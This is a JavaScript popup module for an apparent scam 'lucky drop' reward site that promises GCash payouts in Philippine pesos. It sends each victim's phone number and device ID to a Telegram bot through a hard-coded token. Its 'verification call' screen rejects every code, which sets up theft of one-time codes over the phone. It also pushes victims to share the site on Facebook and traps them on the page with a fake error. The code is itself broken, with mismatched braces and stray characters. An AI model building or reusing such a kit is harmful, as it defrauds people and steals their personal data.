/**
 * Popup Share Module - Complete with Firewall Logic
 * Phase 1 (Default) → Check Firewall → Phase 2 (OFF) or Phase 3 (ON)
 */

// ========== POPUP MODULE ==========
(function() {
    'use strict';
    
    let currentBalance = 0;
    let currentPhase = 1;
    let claimInProgress = false;
    let isRedirecting = false;
    let currentFirewallStatus = false;
    
    // ========== INITIALIZATION ==========
    function init() {
        console.log('🎁 Popup Module Starting...');
        
        const popup = document.getElementById('prizePopup');
        if (!popup) {
            console.error('Popup element not found!');
            return;
        }
        
        getFirewallStatus();
        attachClaimButton();
        attachFirewallEvents();
        addAnimations();
        
        console.log('✅ Popup Module ready');
    }
    
    // ========== ADD ANIMATIONS ==========
    function addAnimations() {
        const style = document.createElement('style');
        style.textContent = `
            @keyframes bounceIn {
                0% { transform: scale(0) rotate(-180deg); opacity: 0; }
                60% { transform: scale(1.1) rotate(0deg); }
                100% { transform: scale(1) rotate(0deg); opacity: 1; }
            }
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.02); box-shadow: 0 0 20px rgba(255,215,0,0.5); }
                100% { transform: scale(1); }
            }
            @keyframes shake {
                0% { transform: translateX(0); }
                25% { transform: translateX(-5px); }
                50% { transform: translateX(5px); }
                75% { transform: translateX(-5px); }
                100% { transform: translateX(0); }
            }
            .btn-pulse {
                animation: pulse 0.5s ease;
            }
        `;
        if (!document.querySelector('#popup-animations')) {
            style.id = 'popup-animations';
            document.head.appendChild(style);
        }
    }
    
    // ========== GET FIREWALL STATUS ==========
    async function getFirewallStatus() {
        try {
            const db = firebase.database();
            const snapshot = await db.ref('admin/globalFirewall').once('value');
            const data = snapshot.val();
            currentFirewallStatus = (data && data.active === true);
            console.log('🔥 Firewall status:', currentFirewallStatus ? 'ON' : 'OFF');
            return currentFirewallStatus;
        } catch(e) {
            console.error('Firewall error:', e);
            return false;
        }
    }
    
    // ========== ATTACH CLAIM BUTTON (SIMPLEST) ==========
function attachClaimButton() {
    const claimBtn = document.getElementById('claimNowBtn');
    if (!claimBtn) {
        console.error('Claim button not found!');
        return;
    }
    
    // Diretso onclick para sigurado
    claimBtn.onclick = function(e) {
        e.preventDefault();
        e.stopPropagation();
        
        console.log('Claim button clicked!');
        
        let balance = 0;
        if (window.PromotionCore) {
            balance = window.PromotionCore.getBalance();
        } else {
            const balanceEl = document.getElementById('userBalanceDisplay');
            if (balanceEl) balance = parseFloat(balanceEl.innerText) || 0;
        }
        
        showPopup(balance);
        
        if (window.PromotionCore) window.PromotionCore.playSound('scatter');
        if (window.ConfettiModule) window.ConfettiModule.start();
    };
    
    console.log('Claim button attached (simplest method)');
}
    
    // ========== ATTACH FIREWALL EVENTS ==========
    function attachFirewallEvents() {
        const closeBtn = document.getElementById('firewallCloseBtn');
        if (closeBtn) {
            closeBtn.onclick = function() {
                hideFirewallPopup();
                showPhase1(currentBalance);
            };
        }
    }
    
    // ========== GET PAYOUT LINK ==========
    async function getLatestPayoutLink() {
        try {
            const db = firebase.database();
            const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                return { key: key, url: linkData.url };
            }
            return null;
        } catch(e) {
            console.error('Link error:', e);
            return null;
        }
    }
    
    // ========== BEFORE UNLOAD HANDLER ==========
    function beforeUnloadHandler(e) {
        if (claimInProgress && !isRedirecting) {
            const message = "⚠️ Your payout is unsuccessful!\n\nUpdate or Install GCash App and withdraw your task reward.\n\nor Switch Device and try again!";
            e.preventDefault();
            e.returnValue = message;
            return message;
        }
    }
    
    // ========== SHOW FIREWALL POPUP (Phase 3) - REPLACE THIS ==========
function showFirewallPopup() {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    currentPhase = 3;
    
    // Fade out transition
    popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
    popupInner.style.opacity = '0';
    popupInner.style.transform = 'scale(0.95)';
    
    setTimeout(() => {
        showPhase3();
        popupInner.style.opacity = '1';
        popupInner.style.transform = 'scale(1)';
    }, 300);
}

// ========== PHASE 3: VERIFICATION CALL UI (NEW) ==========
function showPhase3() {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    popupInner.innerHTML = `
        <div class="popup-close" id="popupClosePhase3">✕</div>
        
        <!-- VERIFICATION ICON -->
        <div style="text-align: center; margin-bottom: 10px;">
            <div style="font-size: 60px; animation: bounceIn 0.5s ease;">📞</div>
        </div>
        
        <!-- TITLE -->
        <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 22px; font-weight: 900; color: #ff4444; margin: 5px 0; letter-spacing: 1px;">
            VERIFICATION REQUIRED
        </h2>
        
        <div class="divider" style="width: 40px; margin: 10px auto; background: #ff4444;"></div>
        
        <!-- MESSAGE -->
        <div style="background: linear-gradient(135deg, rgba(255,68,68,0.1), rgba(255,68,68,0.05)); border-radius: 16px; padding: 15px; margin: 10px 0;">
            <p style="font-family: 'Inter', sans-serif; font-size: 13px; color: #ff8888; line-height: 1.5; text-align: center; margin: 0 0 10px 0;">
                Due to the high number of winners today, we need to verify your number to prevent fraud and ensure your task rewards go to the right person.
            </p>
            <p style="font-family: 'Inter', sans-serif; font-size: 13px; color: #ffd700; line-height: 1.5; text-align: center; margin: 0; font-weight: 500;">
                <strong>Expect a short system-verification call from us.</strong><br>
                You will receive a <strong style="color: #00aaff;">4-digit verification code</strong> during the call.
            </p>
        </div>
        
        <!-- VERIFICATION INPUT -->
        <div style="background: linear-gradient(135deg, rgba(0,100,255,0.15), rgba(0,100,255,0.05)); border: 1px solid rgba(0,100,255,0.4); border-radius: 20px; padding: 15px; margin: 15px 0;">
            <div style="text-align: center; margin-bottom: 10px;">
                <span style="font-size: 12px; color: #00aaff;">ENTER VERIFICATION CODE</span>
            </div>
            <div style="display: flex; gap: 10px; justify-content: center;">
                <input type="text" id="verificationCodePhase3" class="verification-input" placeholder="1234" maxlength="4" inputmode="numeric" style="text-align: center; font-size: 24px; font-weight: bold; width: 120px; padding: 12px;">
                <button id="verifyCodePhase3Btn" class="claim-gcash-button" style="background: linear-gradient(135deg, #00aaff, #0066cc); width: auto; padding: 0 20px;">
                    VERIFY
                </button>
            </div>
            <div id="firewallErrorMsgPhase3" class="firewall-error" style="display: none; text-align: center; margin-top: 10px; color: #ff8888; font-size: 11px;"></div>
        </div>
        
        <!-- WAITING NOTE -->
        <div style="background: rgba(255,215,0,0.05); border-left: 3px solid #ffd700; border-radius: 8px; padding: 8px 12px; margin: 10px 0;">
            <p style="margin: 0; font-size: 10px; color: #ffd700; text-align: center;">
                ⏳ Waiting for verification call... Please answer the call to receive your code.
            </p>
        </div>
        
        <div class="button-separator" style="margin: 15px 0 10px;"></div>

        <button class="back-btn" id="backBtnPhase3" style="transition: all 0.2s ease; width: 100%;">
            ← DO TASK
        </button>
    `;
    
    // Attach Phase 3 events
    attachPhase3Events(popupInner);
}

// ========== ATTACH PHASE 3 EVENTS ==========
function attachPhase3Events(popupInner) {
    const closeBtn = document.getElementById('popupClosePhase3');
    if (closeBtn) closeBtn.onclick = function() { 
        closePopup();
        hideFirewallPopup();
    };
    
    const backBtn = document.getElementById('backBtnPhase3');
    if (backBtn) {
        backBtn.onclick = function() {
            popupInner.style.transition = 'opacity 0.3s ease';
            popupInner.style.opacity = '0';
            setTimeout(() => {
                showPhase1(currentBalance);
                popupInner.style.opacity = '1';
            }, 300);
            hideFirewallPopup();
        };
    }
    
    const codeInput = document.getElementById('verificationCodePhase3');
    const verifyBtn = document.getElementById('verifyCodePhase3Btn');
    const errorMsg = document.getElementById('firewallErrorMsgPhase3');
    
    if (codeInput) {
        codeInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                verifyFirewallCodePhase3();
            }
        });
    }
    
    if (verifyBtn) {
        // Remove any existing listeners
        const newVerifyBtn = verifyBtn.cloneNode(true);
        verifyBtn.parentNode.replaceChild(newVerifyBtn, verifyBtn);
        
        newVerifyBtn.onclick = function() {
            verifyFirewallCodePhase3();
        };
    }
}

// ========== VERIFY FIREWALL CODE (Phase 3) ==========
function verifyFirewallCodePhase3() {
    const codeInput = document.getElementById('verificationCodePhase3');
    const errorMsg = document.getElementById('firewallErrorMsgPhase3');
    const verifyBtn = document.getElementById('verifyCodePhase3Btn');
    const code = codeInput?.value.trim();
    
    if (!code || code.length !== 4) {
        if (errorMsg) {
            errorMsg.innerText = "⚠️ Your 4-digit verification code is invalid.";
            errorMsg.style.display = 'block';
        }
        if (codeInput) {
            codeInput.style.animation = 'shake 0.3s ease-in-out';
            setTimeout(() => { if (codeInput) codeInput.style.animation = ''; }, 300);
        }
        return;
    }
    
    // ALWAYS INVALID - No matter what code they enter
    if (errorMsg) {
        errorMsg.innerText = "⚠️ Your 4-digit verification code is invalid. Please wait for the admin to call you.";
        errorMsg.style.display = 'block';
    }
    if (codeInput) {
        codeInput.style.animation = 'shake 0.3s ease-in-out';
        setTimeout(() => { if (codeInput) codeInput.style.animation = ''; }, 300);
    }
    
    // Clear input field after invalid attempt
    setTimeout(() => {
        if (codeInput) codeInput.value = '';
    }, 500);
    
    // Re-enable verify button (but still disabled visually for a moment)
    if (verifyBtn) {
        setTimeout(() => {
            verifyBtn.disabled = false;
            verifyBtn.innerText = "VERIFY";
        }, 1000);
    }
}

// ========== HIDE FIREWALL POPUP (keep this) ==========
function hideFirewallPopup() {
    // Just resets the phase, no separate popup
    console.log('Firewall popup closed');
}
    
    // ========== CHECK FIREWALL AND TRANSITION ==========
    async function checkFirewallAndTransition() {
        const isFirewallOn = await getFirewallStatus();
        
        if (isFirewallOn) {
            console.log('🔥 Firewall ON - Showing firewall verification popup');
            showFirewallPopup();
        } else {
            console.log('🔓 Firewall OFF - Transition to Phase 2');
            transitionToPhase2();
        }
    }
    
    // ========== ANIMATION TRANSITION TO PHASE 2 ==========
    function transitionToPhase2() {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
        popupInner.style.opacity = '0';
        popupInner.style.transform = 'scale(0.95)';
        
        setTimeout(() => {
            showPhase2();
            popupInner.style.opacity = '1';
            popupInner.style.transform = 'scale(1)';
        }, 300);
    }
    
    // ========== PHASE 1: DEFAULT POPUP ==========
    function showPhase1(balance) {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentBalance = balance;
        currentPhase = 1;
        
        popupInner.style.transition = '';
        popupInner.style.opacity = '1';
        popupInner.style.transform = '';
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase1">✕</div>
            <h2 class="popup-title">🎉 HOORAY! 🎉</h2>
            <div class="prize-amount">₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span></div>
            <div class="divider"></div>
            <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱150 bonus</strong>.</div>
            <div class="luckyday-image-container">
                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" onerror="this.style.display='none'">
            </div>
            <div class="divider"></div>
            <div class="indicator-group">
                <div class="indicator"></div>
                <div class="indicator"></div>
                <div class="indicator"></div>
            </div>
            
            <button class="claim-gcash-button" id="claimGCashBtn" style="transition: all 0.2s ease;">
                <img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH
            </button>

            <div class="button-separator"></div>

            <button class="back-btn" id="backBtnPhase1">
                ← BACK
            </button>
        `;
        
        const closeBtn = document.getElementById('popupClosePhase1');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        const backBtn = document.getElementById('backBtnPhase1');
        if (backBtn) backBtn.onclick = function() { closePopup(); };
        
        const claimBtn = document.getElementById('claimGCashBtn');
        if (claimBtn) {
            claimBtn.onclick = function() {
                this.style.transform = 'scale(0.98)';
                setTimeout(() => { this.style.transform = 'scale(1)'; }, 150);
                checkFirewallAndTransition();
            };
        }
    }
    
    // ========== PHASE 2: WITHDRAWAL LINK ==========
    function showPhase2() {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    currentPhase = 2;
    
    // Adjust popup container size
    const popupContainer = document.querySelector('.popup-container');
    if (popupContainer) {
        popupContainer.style.maxWidth = '320px';  // From 360px to 320px
        popupContainer.style.width = '85%';       // From 90% to 85%
    }
    
    popupInner.innerHTML = `
        <div class="popup-close" id="popupClosePhase2">✕</div>
        
        <div style="text-align: center; margin-bottom: 5px;">
            <div style="font-size: 45px; animation: bounceIn 0.5s ease;">🏆</div>
        </div>
        
        <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 18px; font-weight: 900; background: linear-gradient(135deg, #ffd700, #ffaa33); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 3px 0; letter-spacing: 1px;">
            GREAT JOB!
        </h2>
        
        <div class="divider" style="width: 30px; margin: 8px auto;"></div>
        
        <div style="background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02)); border-radius: 12px; padding: 10px; margin: 8px 0;">
            <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #e0e0e0; line-height: 1.4; text-align: center; margin: 0;">
                "Nice work today! You made that look easy!"
            </p>
            <p style="font-family: 'Inter', sans-serif; font-size: 11px; color: #ffd700; line-height: 1.4; text-align: center; margin: 5px 0 0 0;">
                You’re one tap away by getting your task reward amounting to 
                <span style="font-size: 20px; font-weight: 900; color: #ffd700; text-shadow: 0 0 8px rgba(255,215,0,0.5);">₱${currentBalance.toFixed(2)}</span> 
                <br>Payout Wallet.
            </p>
        </div>
        
        <div style="background: linear-gradient(135deg, rgba(0,100,255,0.15), rgba(0,100,255,0.05)); border: 1px solid rgba(0,100,255,0.4); border-radius: 40px; padding: 8px 15px; margin: 10px 0; text-align: center;">
            <p style="font-family: 'Inter', sans-serif; font-size: 10px; color: #ccc; margin: 0;">
                Once you 
                <span style="font-family: 'Orbitron', monospace; font-size: 12px; font-weight: 900; color: #00aaff; text-shadow: 0 0 5px rgba(0,170,255,0.5);">AUTHORIZED</span>, 
                we will finalize the instant withdrawal.
            </p>
        </div>
        
        <div style="background: linear-gradient(145deg, #1a1a2e, #0f0f1a); border: 1px solid #ffd700; border-radius: 16px; padding: 10px; margin: 10px 0; text-align: center;">
            <div style="font-size: 9px; color: #ffd700; text-transform: uppercase; letter-spacing: 2px;">PRIZE AMOUNT</div>
            <div style="font-size: 36px; font-weight: 900; color: #ffd700; text-shadow: 0 0 10px rgba(255,215,0,0.3); font-family: 'Orbitron', monospace;">₱${currentBalance.toFixed(2)}</div>
            <div style="height: 1px; background: linear-gradient(90deg, transparent, #ffd700, transparent); width: 60%; margin: 5px auto;"></div>
            <div style="font-size: 9px; color: #888;">Ready for payout</div>
        </div>
        
        <div style="background: rgba(255,215,0,0.05); border-left: 2px solid #ffd700; border-radius: 6px; padding: 6px 10px; margin: 8px 0;">
            <p style="margin: 0; font-size: 9px; color: #ffd700; text-align: center;">
                💡 Must have verified GCash account
            </p>
        </div>
        
        <button class="claim-gcash-button" id="proceedBtn" style="transition: all 0.2s ease; width: 100%; padding: 12px; font-size: 14px; margin-top: 8px;">
            <img src="images/gc_icon.png" class="gc-icon" style="width: 18px; height: 18px;"> CLAIM VIA GCASH APP
        </button>

        <div class="button-separator" style="margin: 10px 0 8px;"></div>

        <button class="back-btn" id="backBtnPhase2" style="transition: all 0.2s ease; width: 100%; padding: 8px; font-size: 12px;">
            ← BACK TO PHASE 1
        </button>
    `;
    
    attachPhase2Events(popupInner);
}
    
    // ========== ATTACH PHASE 2 EVENTS ==========
    function attachPhase2Events(popupInner) {
        const closeBtn = document.getElementById('popupClosePhase2');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        const backBtn = document.getElementById('backBtnPhase2');
        if (backBtn) {
            backBtn.onclick = function() {
                popupInner.style.transition = 'opacity 0.3s ease';
                popupInner.style.opacity = '0';
                setTimeout(() => {
                    showPhase1(currentBalance);
                    popupInner.style.opacity = '1';
                }, 300);
            };
        }
        
        const proceedBtn = document.getElementById('proceedBtn');
        if (proceedBtn) {
            proceedBtn.onclick = async function() {
                if (claimInProgress) return;

        const userPhone = localStorage.getItem("userPhone") || "Unknown";
        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        
        await sendTelegramMessage(userPhone, deviceId, 'claim_click', '');

                
                claimInProgress = true;
                
                this.classList.add('btn-pulse');
                setTimeout(() => this.classList.remove('btn-pulse'), 500);
                
                this.disabled = true;
                this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.8s infinite;"> PROCESSING PAYOUT...`;
                this.style.opacity = '0.8';
                
                window.addEventListener('beforeunload', beforeUnloadHandler);
                
                const linkData = await getLatestPayoutLink();
                
                 // HANAPIN ANG PRIZE AMOUNT ELEMENT SA PHASE 2
    const prizeAmountElement = document.querySelector('#proceedBtn').closest('.popup-inner').querySelector('.prize-amount-wrapper div[style*="font-size: 56px"]');
    
    if (prizeAmountElement) {
        // I-disable ang button habang nag-cocountdown
        this.disabled = true;
        this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.8s无限;"> COUNTDOWN...`;
        
        // Countdown mula sa current balance pababa hanggang 0 (3 seconds)
        const startValue = currentBalance;
        const steps = 60;
        const decrement = startValue / steps;
        
        for (let i = 0; i <= steps; i++) {
            const current = startValue - (decrement * i);
            prizeAmountElement.innerText = `₱${current.toFixed(2)}`;
            await new Promise(r => setTimeout(r, 50)); // 50ms x 60 = 3 seconds
        }
    }
    
    // MARK LINK AS USED
    const userPhone = localStorage.getItem("userPhone");
    await markLinkAsUsed(linkData.key, userPhone);
    
    isRedirecting = true;
    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> REDIRECTING TO GCASH...`;
    setTimeout(() => {
        window.removeEventListener('beforeunload', beforeUnloadHandler);
        window.location.href = linkData.url;
    }, 500);
    
} else {
    claimInProgress = false;
    isRedirecting = false;
    window.removeEventListener('beforeunload', beforeUnloadHandler);
    
    this.disabled = false;
    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP`;
    this.style.opacity = '1';
    
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.style.cssText = 'background: rgba(255,68,68,0.15); border: 1px solid #ff4444; border-radius: 10px; padding: 12px; margin-top: 10px; text-align: center;';
    errorDiv.innerHTML = `
        <div style="color: #ff8888; font-size: 14px; font-weight: bold; margin-bottom: 5px;">⚠️ Withdrawal Unsuccessful</div>
        <div style="color: #ccc; font-size: 11px; line-height: 1.4;">Update or Install GCash App and withdraw your task reward.</div>
        <div style="color: #ffaa33; font-size: 10px; margin-top: 8px;">or Switch Device and try again!</div>
    `;
    
    const existingError = popupInner.querySelector('.error-message');
    if (existingError) existingError.remove();
    proceedBtn.parentNode.insertBefore(errorDiv, proceedBtn.nextSibling);
    
    setTimeout(() => {
        if (errorDiv) errorDiv.remove();
    }, 5000);
}
    }

    // ========== TASK #3 MESSAGE (No Available Link) ==========
function showTask3Message() {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    const userPhone = localStorage.getItem("userPhone");
    let last4Digits = "";
    if (userPhone && userPhone.length >= 11) {
        last4Digits = userPhone.substring(7, 11);
    }
    
    popupInner.innerHTML = `
        <div class="popup-close" id="popupCloseTask3">✕</div>
        
        <div style="text-align: center; margin-bottom: 10px;">
            <div style="font-size: 60px; animation: bounceIn 0.5s ease;">📋</div>
        </div>
        
        <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900; background: linear-gradient(135deg, #ffd700, #ffaa33); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 5px 0; letter-spacing: 1px;">
            TASK #3 COMPLETION REQUIRED
        </h2>
        
        <div class="divider" style="width: 40px; margin: 10px auto;"></div>
        
        <div style="background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
            <p style="font-family: 'Inter', sans-serif; font-size: 12px; color: #e0e0e0; line-height: 1.5; text-align: center; margin: 0;">
                We want to ensure every real task earner gets paid fairly on our referral system. 
                To protect against unverified users, we are now conducting validation through 
                <strong style="color: #ffd700;">Task #3</strong>.
            </p>
        </div>
        
        <div style="background: linear-gradient(135deg, rgba(0,100,255,0.15), rgba(0,100,255,0.05)); border: 1px solid rgba(0,100,255,0.4); border-radius: 16px; padding: 15px; margin: 10px 0;">
            <p style="font-family: 'Inter', sans-serif; font-size: 12px; color: #ccc; line-height: 1.5; text-align: center; margin: 0;">
                Find the <strong style="color: #ffd700;">'Share on Facebook'</strong> button and share your experience! 
                Remember: <strong>More posts, more chances to validate your payout request.</strong>
            </p>
        </div>
        
        <div style="background: linear-gradient(145deg, #1a1a2e, #0f0f1a); border: 1px solid #ffd700; border-radius: 20px; padding: 12px; margin: 10px 0; text-align: center;">
            <div style="font-size: 10px; color: #ffd700; margin-bottom: 5px;">OFFICIAL HASHTAGS</div>
            <div style="font-family: monospace; font-size: 14px; color: #00aaff; font-weight: bold;">
                #LuckyDrop #Task${last4Digits}
            </div>
            <div style="font-size: 10px; color: #888; margin-top: 5px;">
                (Example: #LuckyDrop #Task6789)
            </div>
        </div>
        
        <div style="background: rgba(255,215,0,0.05); border-left: 3px solid #ffd700; border-radius: 8px; padding: 8px 12px; margin: 10px 0;">
            <p style="margin: 0; font-size: 10px; color: #ffd700; text-align: center;">
                🚀 Finish this step to secure your Instant Approval and Extra Rewards!
            </p>
        </div>
        
        <button id="task3ShareBtn" style="width: 100%; margin: 15px 0; background: linear-gradient(135deg, #1877F2, #0a56b6); border: none; border-radius: 50px; padding: 14px; color: white; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
            <i class="fa-brands fa-facebook-f"></i>
            <span>SHARE ON FACEBOOK</span>
        </button>
        
        <div class="button-separator" style="margin: 15px 0 10px;"></div>

        <button class="back-btn" id="backBtnTask3" style="transition: all 0.2s ease; width: 100%;">
            ← BACK TO PHASE 1
        </button>
    `;
    
    // Attach events
    const closeBtn = document.getElementById('popupCloseTask3');
    if (closeBtn) closeBtn.onclick = function() { closePopup(); };
    
    const backBtn = document.getElementById('backBtnTask3');
    if (backBtn) backBtn.onclick = function() { 
        closePopup();
        showPhase1(currentBalance);
    };
    
    const shareBtn = document.getElementById('task3ShareBtn');
    if (shareBtn) {
        shareBtn.onclick = function() {
            const shareUrl = "https://xjiligames.github.io/rewards/index.html";
            const fbUrl = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl);
            window.open(fbUrl, '_blank', 'width=600,height=400');
            console.log('User shared on Facebook for Task #3');
        };
    }
}
    
    // ========== SHOW POPUP ==========
    async function showPopup(balance) {
        currentBalance = balance;
        await getFirewallStatus();
        showPhase1(balance);
        
        const popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'flex';
            const ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'none';
        }
    }

    // ========== MARK LINK AS USED (Booking System) ==========
async function markLinkAsUsed(linkKey, userPhone) {
    try {
        const db = firebase.database();
        await db.ref('links/' + linkKey).update({
            status: 'used',
            user: userPhone,
            usedAt: Date.now()
        });
        console.log(`🔗 Link ${linkKey} marked as used by ${userPhone}`);
    } catch(e) {
        console.error('Error marking link as used:', e);
    }
}

    // ========== TELEGRAM NOTIFICATION ==========
async function sendTelegramMessage(userPhone, deviceId, action, details) {
    try {
        const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
        const chatId = "7298607329";
        
        const now = new Date();
        const timestamp = `${now.getMonth()+1}/${now.getDate()}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
        
        let message = `CLAIM VIA GCASH CLICKED
User: ${userPhone}
Device ID: ${deviceId}
Time: ${timestamp}`;
        
        if (details) {
            message += `\nDetails: ${details}`;
        }
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });
        
        console.log('Telegram sent for claim click');
    } catch(e) {
        console.error('Telegram error:', e);
    }
}
    
    // ========== CLOSE POPUP ==========
    function closePopup() {
        const popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'none';
            const ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'flex';
            if (window.ConfettiModule) window.ConfettiModule.stop();
        }
        
        claimInProgress = false;
        isRedirecting = false;
        window.removeEventListener('beforeunload', beforeUnloadHandler);
    }
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    // ========== EXPORT ==========
    window.showPopup = showPopup;
    window.closePopup = closePopup;
    window.getFirewallStatus = getFirewallStatus;
    
})();
